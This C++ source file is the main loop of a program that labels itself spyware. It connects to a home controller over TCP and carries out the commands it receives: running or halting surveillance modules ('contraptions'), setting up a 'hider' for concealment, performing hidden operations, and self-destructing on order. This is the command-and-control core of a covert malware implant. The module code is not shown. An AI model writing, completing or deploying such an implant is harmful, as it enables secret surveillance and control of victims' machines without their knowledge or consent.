#include <iostream>

#include "../Maneger/Connection.h"
#include "../IncludeCPP/Status.h"

#include "../Maneger/HiderManeger.h"
#include "../Hider/HiderCodes.h"
#include "../Maneger/Listener.h"
#include "../Maneger/Connection.h"
#include "contrapMeta.h"
#include "Contraption.h"
#include "ContraptionAdmin.h"

#define PORT (65410)

#define DEBUG

void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);


int main() {
    
    std::cerr << "started spyware" << std::endl;
    
    HiderManeger& hiderManeger = HiderManeger::getInstance();
    ContraptionAdmin admin;
    std::shared_ptr<Connection> conn;
    
    sleep(2); // wait for python to start

    if (Connection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
        exit(EXIT_FAILURE);
    }
    bool cont = true;
    while (cont)
    {
        loopIter(conn, hiderManeger, admin);
        std::cerr << "spyware: compleated loop iter\n";
    }

    return EXIT_SUCCESS;
}



void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
{
    command cmd;

    conn->recvData(sizeof(cmd), (char*)&cmd);

    Status stat = DID_NOTHING;
    std::string strRes = "";

    switch (cmd.fncode)
    {
    case RunContraption:
        stat = admin.runContraption(conn, cmd.identifier);
        break;

    case HaltContraption:
        stat = admin.haltContraption(cmd.identifier);
        break;

    case SUICIDE:
        conn->sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
        std::exit(EXIT_SUCCESS);
    
    case HIDER_SETUP:
        stat = hiderManeger.setUpHider(cmd.strParam);
        break;
    }

    if (cmd.fncode & HIDDEN_OPRATION) {
        stat = hiderManeger.hiddenAction(cmd, conn);
    }

    std::cerr << "Spyware:  Conn: res-" << stat << " response-\n" << strRes << std::endl;
    conn->sendResponce(stat, strRes);
    std::cerr << "responce sent" << std::endl;
}
